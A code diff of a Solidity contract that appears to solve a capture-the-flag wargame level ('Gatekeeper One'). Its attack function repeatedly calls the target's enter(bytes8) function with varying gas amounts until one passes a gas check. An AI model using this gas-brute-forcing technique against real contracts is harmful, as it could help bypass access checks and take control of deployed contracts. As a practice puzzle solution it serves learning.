@@ -56,20 +56,15 @@ contract Level13Solution is Ownable {
     }
 
     function attack(bytes8 _key) public onlyOwner {
-        // IGatekeeperOne(targetAddress).enter(_key);
-
         for (uint256 i = 0; i < 120; i++) {
             bytes memory payload = abi.encodeWithSignature(
                 "enter(bytes8)",
                 _key
             );
-            (bool sent, ) = targetAddress.call{gas: i + 150 + 8191 * 3}(
-                payload
-            );
+            (bool sent, ) = targetAddress.call{gas: i + 8191 * 3}(payload);
             if (sent) {
                 break;
             }
-            // require(sent, "Failed to send Ether");
         }
     }
 }
